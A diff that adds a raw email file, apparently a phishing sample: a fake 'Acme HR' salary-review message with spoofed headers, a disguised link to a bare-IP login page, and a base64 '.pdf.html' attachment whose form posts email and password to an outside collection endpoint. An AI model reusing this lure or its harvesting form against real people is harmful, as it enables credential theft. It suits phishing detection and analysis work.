@@ -1,0 +1,52 @@
+Delivered-To: jane.doe@acme-corp.com
+Received: by 2002:a05:6a20:9f4e:b0:1d2:3e8a:aa01 with SMTP id mo14csp331921pzb;
+        Fri, 13 Nov 2026 07:41:19 -0800 (PST)
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=pass header.i=@sendgrid.info header.s=smtpapi header.b=Zx81;
+       spf=pass (google.com: domain of bounces+31337-ab12@em4021.sendgrid.net designates 167.89.12.44 as permitted sender) smtp.mailfrom="bounces+31337-ab12@em4021.sendgrid.net";
+       dmarc=fail (p=QUARANTINE sp=QUARANTINE dis=QUARANTINE) header.from=acme-corp.com
+Return-Path: <bounces+31337-ab12@em4021.sendgrid.net>
+Received: from o1.ptr4021.sendgrid.net (o1.ptr4021.sendgrid.net. [167.89.12.44])
+        by mx.google.com with ESMTPS id 6a1803df08f44-6d18b1a9cb2si22811856d6.311.2026.11.13.07.41.18
+        for <jane.doe@acme-corp.com>
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Fri, 13 Nov 2026 07:41:19 -0800 (PST)
+Received-SPF: pass (google.com: domain of bounces+31337-ab12@em4021.sendgrid.net designates 167.89.12.44 as permitted sender) client-ip=167.89.12.44;
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@sendgrid.info header.s=smtpapi header.b=Zx81;
+       spf=pass (google.com: domain of bounces+31337-ab12@em4021.sendgrid.net designates 167.89.12.44 as permitted sender) smtp.mailfrom="bounces+31337-ab12@em4021.sendgrid.net";
+       dmarc=fail (p=QUARANTINE sp=QUARANTINE dis=QUARANTINE) header.from=acme-corp.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.info;
+	h=content-type:from:mime-version:subject:reply-to:to; s=smtpapi; bh=x; b=Zx81
+Received: from c-73-15-22-9.hsd1.ca.comcast.net (unknown [73.15.22.9])
+	by geopod-ismtpd-7 (SG) with HTTP id 3kq0aGx2RkKz
+	Fri, 13 Nov 2026 15:41:17.512 +0000 (UTC)
+Authentication-Results: mail.acme-corp.com; spf=pass smtp.mailfrom=acme-corp.com; dkim=pass header.d=acme-corp.com; dmarc=pass header.from=acme-corp.com
+From: "Acme HR" <hr@acme-corp.com>
+Reply-To: hr-payroll@acmecorp-hr.com
+To: jane.doe@acme-corp.com
+Subject: Action required: confirm your 2026 salary review
+Date: Fri, 13 Nov 2026 15:41:17 +0000
+Message-ID: <3kq0aGx2RkKz@geopod-ismtpd-7>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY1"
+
+--BOUNDARY1
+Content-Type: text/html; charset=utf-8
+
+<p>Hi Jane,</p><p>Your 2026 salary review is ready. Please confirm before Friday:</p>
+<p><a href="http://45.9.12.8/acme/login.php">https://portal.acme-corp.com/hr/review</a></p>
+<p>Or use this link: <a href="https://bit.ly/3AcmeHR">View review</a></p>
+<p>See the attached document.</p>
+--BOUNDARY1
+Content-Type: text/html; name="Salary_Review_2026.pdf.html"
+Content-Disposition: attachment; filename="Salary_Review_2026.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGgyPkFjbWUgQ29ycCBQYXlyb2xsPC9oMj48cD5TaWduIGluIHRvIHZpZXcg
+eW91ciBzYWxhcnkgcmV2aWV3LjwvcD4KPGZvcm0gYWN0aW9uPSJodHRwczovL2FjbWUtcGF5cm9s
+bC1yZXZpZXcud2ViLmFwcC9jb2xsZWN0IiBtZXRob2Q9InBvc3QiPgo8aW5wdXQgdHlwZT0iZW1h
+aWwiIG5hbWU9InUiPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+PGJ1dHRvbj5TaWdu
+IGluPC9idXR0b24+PC9mb3JtPjwvYm9keT48L2h0bWw+
+
+--BOUNDARY1--
